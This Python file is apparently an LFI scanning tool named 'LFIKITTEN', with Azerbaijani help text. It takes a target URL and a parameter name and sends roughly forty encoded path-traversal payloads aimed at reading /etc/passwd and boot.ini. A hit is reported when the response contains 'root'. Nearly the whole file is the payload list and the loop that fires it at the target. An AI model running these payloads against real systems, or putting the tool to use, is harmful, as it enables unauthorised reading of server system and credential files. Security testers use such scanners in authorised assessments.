import subprocess
import requests
from optparse import OptionParser
import time

print("""

  _      ______ _____ _  _______ _______ _______ ______ _   _ 
 | |    |  ____|_   _| |/ /_   _|__   __|__   __|  ____| \ | |
 | |    | |__    | | | ' /  | |    | |     | |  | |__  |  \| |
 | |    |  __|   | | |  <   | |    | |     | |  |  __| | . ` |
 | |____| |     _| |_| . \ _| |_   | |     | |  | |____| |\  |
 |______|_|    |_____|_|\_\_____|  |_|  _  |_|  |______|_| \_|
         | |           \ \   / /       (_)/ _|                
         | |__  _   _   \ \_/ /   _ ___ _| |_                 
         | '_ \| | | |   \   / | | / __| |  _|                
         | |_) | |_| |    | || |_| \__ \ | |                  
         |_.__/ \__, |    |_| \__,_|___/_|_|                  
                 __/ |                                        
                |___/    
                                        
""")

print("Program is starting...")
 
time.sleep(4)


def main(): 
    parser=OptionParser()
    parser.add_option("-u","--url",dest="url",help="Aləti işə sala bilmək üçün url parametrinin dəyərini təyin etməlisiniz.")
    parser.add_option("-v", "--verbose", action="store_true", dest="verbose", help="Gedən sorğuları görmək üçün verbose modu aktivləşdirin.")
    parser.add_option("-p", "--parameter", dest="parameter", help="LFI zəifliyini istismar etmək üçün istifadə olunacaq parametr (page,file,path,download,...)")
    (options, _)=parser.parse_args()
    
    url = options.url
    verbose = options.verbose
    parameter = options.parameter
     

    payloads = [
        "../../../../../../etc/passwd",
        "../../../../../../../..//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
        "..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd",
        "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd",
        "..\..\..\..\..\..\..\..\/etc/passwd",
        "..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd",
        "%252e%252e\%252e%252e\/etc/passwd..%5c/etc/passwd",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd",
        "%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd",
        "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd",
        "..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd",
        "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd",
        "..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd",
        "../../../../../../../..//etc/passwd%00index.html",
        "..../..../..../..../..../..../..../....//etc/passwd",
        "....\....\....\....\....\....\....\....\/etc/passwd",
        "....//....//....//....//....//....//....//....//....//etc/passwd",
        "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215/etc/passwd",
        "..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216/etc/passwd",
        "..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8/etc/passwd",
        "..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025/etc/passwd",
        "%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\/etc/passwd",
        "%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216/etc/passwd",
        "..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f/etc/passwd",
        "0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd",
        "..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd",
        "0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\/etc/passwd",
        "..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd",
        "..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c/etc/passwd",
        "..///..///..///..///..///..///..///..////etc/passwd",
        "..//..//..//..//..//..//..//..///etc/passwd",
        "..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd",
        "./\/././\/././\/././\/././\/././\/././\/.//etc/passwd",
        ".\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd",
        "../../../../../../../../boot.ini" 
    ]


    for payload in payloads:
        params = {parameter: payload}
        if verbose:
            print(f"Sending request to: {url} with params: {params}")
            
        response = requests.get(url, params=params)


        if response.status_code == 200:
            if "root" in response.text:
                print(f"LFI vulnerability detected with payload: {payload}")

                break


if __name__ == "__main__":
    main()